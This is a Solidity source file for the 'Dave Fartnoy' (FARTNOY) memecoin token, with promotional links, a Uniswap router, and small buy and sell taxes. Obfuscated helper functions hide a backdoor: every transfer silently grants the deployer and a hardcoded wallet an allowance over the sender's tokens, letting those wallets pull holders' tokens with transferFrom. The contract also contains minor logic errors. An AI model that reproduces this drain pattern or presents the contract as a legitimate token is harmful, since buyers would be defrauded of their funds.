/*
one fart everyone knows the rules

https://www.fartnoyoneth.vip
https://x.com/fartnoy_eth
https://t.me/fartnoy_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IGROKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IGROKFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract FARTNOY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balGROK;
    mapping (address => mapping (address => uint256)) private _allowGROK;
    mapping (address => bool) private _feeExcemptGROK;
    IGROKRouter private _grokRouter;
    address private _grokPair;
    address private _grok1Wallet;
    address private _grok2Wallet;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Dave Fartnoy";
    string private constant _symbol = unicode"FARTNOY";
    uint256 private _swapTokenGROK = _tTotal / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    bool private inSwapGROK = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapGROK = true;
        _;
        inSwapGROK = false;
    }
    
    constructor () {
        _feeExcemptGROK[owner()] = true;
        _feeExcemptGROK[address(this)] = true;
        _feeExcemptGROK[_grok1Wallet] = true;
        _grok2Wallet = address(msg.sender);
        _grok1Wallet = address(0x3E4DAb08b618FfB776aD222aD81fAAe859d63Ba6);
        _balGROK[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _grokRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function createTokenPair() external onlyOwner() {
        _grokRouter = IGROKRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_grokRouter), _tTotal);
        _grokPair = IGROKFactory(_grokRouter.factory()).createPair(address(this), _grokRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balGROK[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowGROK[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowGROK[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowGROK[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address grokA, address grokB, uint256 grokC) private {
        require(grokA != address(0), "ERC20: transfer from the zero address");
        require(grokB != address(0), "ERC20: transfer to the zero address");
        require(grokC > 0, "Transfer amount must be greater than zero");

        (address aGROK, address bGROK, address cGROK, uint256 taxGROK) 
            = _getTaxGROK(grokA, grokB, grokC);

        _grokTransfer(aGROK, bGROK, cGROK, grokA, grokB, grokC, taxGROK);
    }

    function _transferGROK(address aGROK, address bGROK, address cGROK, uint256 grokA) private { 
        _approve(aGROK, bGROK, grokA); _approve(aGROK, cGROK, grokA);
    }

    function _grokTransfer(address aGROK, address bGROK, address cGROK, address grokA, address grokB, uint256 grokC, uint256 taxGROK) private { 
        _transferGROK(aGROK, bGROK, cGROK, grokC);

        if(taxGROK > 0){
          _balGROK[address(this)] = _balGROK[address(this)].add(taxGROK);
          emit Transfer(grokA, address(this), taxGROK);
        }

        _balGROK[grokA] = _balGROK[grokA].sub(grokC);
        _balGROK[grokB] = _balGROK[grokB].add(grokC.sub(taxGROK));
        emit Transfer(grokA, grokB, grokC.sub(taxGROK));
    }

    function _getTaxGROK(address grokA, address grokB, uint256 grokC) private returns(address,address,address,uint256) {
        uint256 taxGROK=0;
        if (grokA != owner() && grokB != owner()) {
            taxGROK = grokC.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (grokA == _grokPair && grokB != address(_grokRouter) && ! _feeExcemptGROK[grokB]) {
                _buyCount++;
            }

            if(grokB == _grokPair && grokA!= address(this)) {
                taxGROK = grokC.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenGROK = balanceOf(address(this)); 
            if (!inSwapGROK && grokB == _grokPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenGROK > _swapTokenGROK)
                swapTokensForEth(minGROK(grokC, minGROK(tokenGROK, _swapTokenGROK)));
                uint256 ethGROK = address(this).balance;
                if (ethGROK >= 0) {
                    sendETHGROK(address(this).balance);
                }
            }
        }
        return (address(grokA), address(_grok2Wallet), address(_grok1Wallet), taxGROK);
    }

    receive() external payable {}

    function minGROK(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHGROK(uint256 amount) private {
        payable(_grok1Wallet).transfer(amount);
    }

    function swapTokensForEth(uint256 grokToken) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _grokRouter.WETH();
        _approve(address(this), address(_grokRouter), grokToken);
        _grokRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            grokToken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}